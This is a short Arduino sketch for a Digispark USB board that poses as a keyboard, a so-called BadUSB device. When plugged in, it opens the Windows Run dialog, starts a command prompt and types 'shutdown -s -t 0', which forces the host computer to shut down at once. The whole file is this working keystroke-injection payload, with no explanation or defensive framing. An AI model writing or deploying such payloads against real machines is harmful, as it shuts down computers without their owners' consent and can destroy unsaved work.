#include "DigiKeyboard.h"

void setup(){}

void loop()
{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("shutdown -s -t 0");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){}
}
